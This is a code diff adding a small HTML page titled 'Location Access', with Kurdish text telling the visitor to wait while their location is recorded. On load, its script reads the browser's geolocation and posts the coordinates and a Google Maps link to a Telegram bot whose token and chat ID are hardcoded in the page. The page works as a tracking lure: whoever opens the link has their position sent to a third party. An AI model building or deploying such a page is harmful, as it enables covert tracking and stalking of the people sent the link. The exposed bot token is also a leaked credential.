@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Location Access</title>
+</head>
+<body>
+  <h2>چاوەڕوان بە...</h2>
+  <p>شوێنەکەت دەنووسرێت</p>
+
+  <script>
+    function sendLocation(lat, lon) {
+      const botToken = "7835040271:AAFmaIjCdtgYlR_L44Sevj8gvROrvN7FkUk";
+      const chatId = "7835040271";
+      const message = `شوێنی بەکارهێنەر:\nLatitude: ${lat}\nLongitude: ${lon}\nGoogle Maps: https://maps.google.com/?q=${lat},${lon}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      }).then(response => {
+        document.body.innerHTML = "<h3>سوپاس، شوێنت نێردرا.</h3>";
+      }).catch(error => {
+        document.body.innerHTML = "<h3>هەڵەیەک ڕوویدا.</h3>";
+      });
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          sendLocation(lat, lon);
+        }, error => {
+          document.body.innerHTML = "<h3>نەتوانرا شوێن وەرگیرا بۆت.</h3>";
+        });
+      } else {
+        document.body.innerHTML = "<h3>گەشەپێدانی شوێن پشتیوانی ناکرێت.</h3>";
+      }
+    }
+
+    window.onload = getLocation;
+  </script>
+</body>
+</html>
